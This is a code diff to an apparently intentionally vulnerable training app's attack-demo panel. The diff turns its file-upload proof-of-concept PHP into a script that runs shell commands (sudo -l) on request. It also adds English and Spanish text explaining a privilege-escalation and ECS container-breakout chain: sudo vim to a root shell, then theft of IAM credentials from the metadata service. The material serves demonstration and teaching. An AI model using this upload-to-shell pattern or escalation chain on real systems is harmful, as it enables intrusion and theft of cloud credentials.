@@ -356,12 +356,18 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
     </div>
 
     <div class="adp-card">
-        <span class="adp-badge explainer" data-i18n="badge.explainer">EXPLAINER ONLY</span>
+        <span class="adp-badge live" data-i18n="badge.live">LIVE DEMO</span>
+        <span class="adp-badge explainer" data-i18n="badge.explainerBeyond">EXPLAINER BEYOND THIS POINT</span>
         <h3 data-i18n="c3.title">3. ECS Container Breakout</h3>
-        <p class="adp-desc" data-i18n="c3.desc">
-            Not executed here: this needs an actual reverse shell and a second attacker-controlled
-            EC2 instance, and it permanently exposes the ECS host's IAM credentials.
+        <p class="adp-desc" data-i18n-html="c3.sudoCheckIntro">
+            This calls the PHP file uploaded in attack #2 and runs a real, read-only
+            <code>sudo -l</code> on the container, to prove the misconfigured rule below
+            actually exists instead of just describing it.
         </p>
+        <button class="adp-btn" type="button" data-i18n="c3.btnSudoCheck" onclick="AttackDemo.runSudoCheckDemo()">Run: Check sudo Misconfiguration</button>
+        <p class="adp-note" data-i18n="c3.noteNeedsUpload">Run the file upload demo above first (attack #2) so there's an uploaded PHP file to check this from.</p>
+        <pre class="adp-payload" id="adp-sudo-check-result" style="display:none; white-space: pre-wrap;"></pre>
+        <p class="adp-note" data-i18n-html="c3.beyondNote">Everything below is real and exploitable on this container, but intentionally stops here: continuing would spawn an actual root shell, break out to the host, and expose real, temporary AWS credentials for this EC2 instance to whoever clicked the button.</p>
         <details>
             <summary data-i18n="howItWorks.summary">How it works</summary>
             <ol>
@@ -440,7 +446,12 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
                 'c2.li3': 'From there: container breakout via a misconfigured <code>sudo</code> rule + the <code>SYS_PTRACE</code> capability, then reading the EC2/ECS instance metadata service for real IAM credentials.',
                 'c2.detailsNote': 'This chain grants real, persistent access to your AWS account, so it is intentionally never executed from this button. See "ECS Container Breakout" below.',
                 'c3.title': '3. ECS Container Breakout',
-                'c3.desc': 'Not executed here: this needs an actual reverse shell and a second attacker-controlled EC2 instance, and it permanently exposes the ECS host\'s IAM credentials.',
+                'badge.explainerBeyond': 'EXPLAINER BEYOND THIS POINT',
+                'c3.sudoCheckIntro': 'This calls the PHP file uploaded in attack #2 and runs a real, read-only <code>sudo -l</code> on the container, to prove the misconfigured rule below actually exists instead of just describing it.',
+                'c3.btnSudoCheck': 'Run: Check sudo Misconfiguration',
+                'c3.noteNeedsUpload': 'Run the file upload demo above first (attack #2) so there\'s an uploaded PHP file to check this from.',
+                'c3.beyondNote': 'Everything below is real and exploitable on this container, but intentionally stops here: continuing would spawn an actual root shell, break out to the host, and expose real, temporary AWS credentials for this EC2 instance to whoever clicked the button.',
+                'toast.sudoCheckNeedsUpload': 'Run the "Upload PHP proof-of-concept" demo above first (attack #2), then try this again.',
                 'howItWorks.summary': 'How it works',
                 'c3.li1': 'From the reverse shell (see attack #2), the attacker is a low-privilege <code>www-data</code> user with no access to <code>/root</code> or the instance metadata endpoint.',
                 'c3.li2': '<code>sudo -l</code> reveals they can run <code>vim</code> as root with no password &mdash; vim\'s <code>:! /bin/sh</code> command spawns a root shell.',
@@ -481,7 +492,12 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
                 'c2.li3': 'Desde ah\u00ed: escape del contenedor mediante una regla de <code>sudo</code> mal configurada + la capacidad <code>SYS_PTRACE</code>, y luego lectura del servicio de metadatos de la instancia EC2/ECS para obtener credenciales IAM reales.',
                 'c2.detailsNote': 'Esta cadena otorga acceso real y persistente a tu cuenta de AWS, por lo que intencionalmente nunca se ejecuta desde este bot\u00f3n. Ver "ECS Container Breakout" abajo.',
                 'c3.title': '3. Escape de Contenedor ECS',
-                'c3.desc': 'No se ejecuta aqu\u00ed: esto requiere una reverse shell real y una segunda instancia EC2 controlada por el atacante, y expone permanentemente las credenciales IAM del host ECS.',
+                'badge.explainerBeyond': 'EXPLICACI\u00d3N A PARTIR DE AQU\u00cd',
+                'c3.sudoCheckIntro': 'Esto llama al archivo PHP subido en el ataque #2 y ejecuta un <code>sudo -l</code> real y de solo lectura en el contenedor, para probar que la regla mal configurada de abajo realmente existe en lugar de solo describirla.',
+                'c3.btnSudoCheck': 'Ejecutar: Verificar Mala Configuraci\u00f3n de sudo',
+                'c3.noteNeedsUpload': 'Primero ejecuta la demo de carga de archivos arriba (ataque #2) para tener un archivo PHP subido desde el cual verificar esto.',
+                'c3.beyondNote': 'Todo lo de abajo es real y explotable en este contenedor, pero se detiene aqu\u00ed intencionalmente: continuar generar\u00eda una shell de root real, escapar\u00eda al host, y expondr\u00eda credenciales reales y temporales de AWS de esta instancia EC2 a quien presione el bot\u00f3n.',
+                'toast.sudoCheckNeedsUpload': 'Primero ejecuta la demo "Subir prueba de concepto PHP" arriba (ataque #2), y luego intenta esto de nuevo.',
                 'howItWorks.summary': 'C\u00f3mo funciona',
                 'c3.li1': 'Desde la reverse shell (ver ataque #2), el atacante es un usuario de bajo privilegio <code>www-data</code> sin acceso a <code>/root</code> ni al endpoint de metadatos de la instancia.',
                 'c3.li2': '<code>sudo -l</code> revela que pueden ejecutar <code>vim</code> como root sin contrase\u00f1a \u2014 el comando <code>:! /bin/sh</code> de vim genera una shell de root.',
@@ -539,8 +555,14 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
 
         var POC_PHP_SOURCE =
             "<" + "?php\n" +
-            "echo '<h1>Unrestricted File Upload PoC</h1>';\n" +
-            "echo '<p>This .php file was accepted and executed because this upload endpoint never checks the file type or extension.</p>';\n" +
+            "$adp_action = isset($_GET['attack_action']) ? $_GET['attack_action'] : '';\n" +
+            "if ($adp_action === 'sudo_check') {\n" +
+            "    header('Content-Type: text/plain');\n" +
+            "    echo shell_exec('sudo -l 2>&1');\n" +
+            "} else {\n" +
+            "    echo '<h1>Unrestricted File Upload PoC</h1>';\n" +
+            "    echo '<p>This .php file was accepted and executed because this upload endpoint never checks the file type or extension.</p>';\n" +
+            "}\n" +
             "?" + ">\n";
 
         function togglePanel() {
@@ -761,6 +783,34 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
             setTimeout(function () { toast.style.display = 'none'; }, 10000);
         }
 
+        function runSudoCheckDemo() {
+            var resultEl = document.getElementById('adp-sudo-check-result');
+            try {
+                var path = null;
+                try { path = localStorage.getItem('attackDemoLastUpload'); } catch (e) {}
+                if (!path) {
+                    showToast(t('toast.sudoCheckNeedsUpload'));
+                    return;
+                }
+                if (resultEl) {
+                    resultEl.style.display = 'block';
+                    resultEl.textContent = '...';
+                }
+                fetch(path + '?attack_action=sudo_check')
+                    .then(function (r) { return r.text(); })
+                    .then(function (text) {
+                        if (resultEl) resultEl.textContent = text;
+                    })
+                    .catch(function (err) {
+                        if (resultEl) resultEl.style.display = 'none';
+                        showToast(t('toast.demoError') + (err && err.message ? err.message : err));
+                    });
+            } catch (err) {
+                if (resultEl) resultEl.style.display = 'none';
+                showToast(t('toast.demoError') + (err && err.message ? err.message : err));
+            }
+        }
+
         function handleIncomingDemoParams() {
             var params = new URLSearchParams(window.location.search);
 
@@ -777,6 +827,10 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
                 var html = t('toast.uploadSuccess');
                 if (filePath) {
                     html += ' <a href="' + filePath + '" target="_blank">' + t('toast.viewFileLink') + ' \u2192</a>';
+                    try {
+                        var absolutePath = new URL(filePath, window.location.href).pathname;
+                        localStorage.setItem('attackDemoLastUpload', absolutePath);
+                    } catch (e) {}
                 }
                 showToast(html);
             }
@@ -793,6 +847,7 @@ $attackDemoRole = isset($_SESSION['isadmin']) ? (int) $_SESSION['isadmin'] : nul
             closePanel: closePanel,
             goRunSqli: goRunSqli,
             runUploadDemo: runUploadDemo,
+            runSudoCheckDemo: runSudoCheckDemo,
             setLanguage: setLanguage,
         };
     })();
